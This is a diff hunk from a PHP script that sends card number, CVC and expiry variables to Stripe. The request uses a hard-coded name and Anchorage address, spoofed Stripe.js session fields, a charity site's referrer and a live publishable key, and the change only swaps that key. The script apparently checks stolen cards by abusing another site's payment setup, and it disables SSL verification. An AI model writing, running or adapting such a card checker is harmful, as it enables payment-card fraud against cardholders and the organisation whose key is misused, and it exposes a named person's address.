@@ -377,7 +377,7 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=4821+Ridge+Top+Cir&billing_details[address][line2]=&billing_details[address][city]=Anchorage&billing_details[address][state]=AK&billing_details[address][postal_code]=99508&billing_details[address][country]=US&billing_details[name]=Min+Thant&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=50c29e79-70fb-4db0-806e-601807510536383382&sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af&pasted_fields=number&payment_user_agent=stripe.js%2F3e325ca450%3B+stripe-js-v3%2F3e325ca450%3B+split-card-element&referrer=https%3A%2F%2Ffriendsoflakeclaremont.org&time_on_page=57419&key=pk_live_qVbUTbBD3NFaB0QThLooisJK00we1Bhu4o');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=4821+Ridge+Top+Cir&billing_details[address][line2]=&billing_details[address][city]=Anchorage&billing_details[address][state]=AK&billing_details[address][postal_code]=99508&billing_details[address][country]=US&billing_details[name]=Min+Thant&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=50c29e79-70fb-4db0-806e-601807510536383382&sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af&pasted_fields=number&payment_user_agent=stripe.js%2F3e325ca450%3B+stripe-js-v3%2F3e325ca450%3B+split-card-element&referrer=https%3A%2F%2Ffriendsoflakeclaremont.org&time_on_page=57419&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
